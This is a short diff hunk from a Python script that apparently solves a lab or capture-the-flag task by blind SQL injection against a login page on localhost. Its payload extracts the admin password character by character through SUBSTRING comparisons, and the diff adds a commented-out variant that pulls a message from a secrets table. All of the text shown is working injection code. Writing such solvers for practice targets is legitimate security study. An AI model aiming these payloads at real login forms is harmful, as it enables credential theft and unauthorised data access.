@@ -16,6 +16,7 @@ while True:
     payload = {
       'id':       'admin',
       'password': f"' OR SUBSTRING((SELECT password FROM users WHERE username='admin'), {idx}, 1) <= binary '{chr(mid)}'-- "
+      # 'password': f"' OR SUBSTRING((SELECT message FROM secrets WHERE id=1), {idx}, 1) <= binary '{chr(mid)}'-- "
     }
     r = requests.post('http://localhost:8080/login.php', data=payload)
 
